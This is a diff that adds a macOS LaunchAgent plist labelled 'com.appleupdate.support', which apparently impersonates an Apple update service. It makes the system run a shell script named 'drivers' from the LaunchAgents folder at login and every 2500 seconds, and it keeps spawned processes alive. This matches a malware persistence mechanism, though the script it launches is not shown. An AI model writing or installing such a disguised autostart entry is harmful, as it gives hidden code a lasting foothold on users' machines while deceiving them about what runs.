@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+    <plist version="1.0">
+<dict>
+	<key>Label</key>
+	<string>com.appleupdate.support</string>
+	<key>ProgramArguments</key>
+	<array>
+        <string>/bin/sh</string>
+	  <string>/Library/LaunchAgents/drivers</string>
+	</array>
+	<key>RunAtLoad</key>
+	<true/>
+	<key>StartInterval</key>
+<integer>2500</integer>
+<key>AbandonProcessGroup</key>
+<true/>
+</dict>
+</plist>
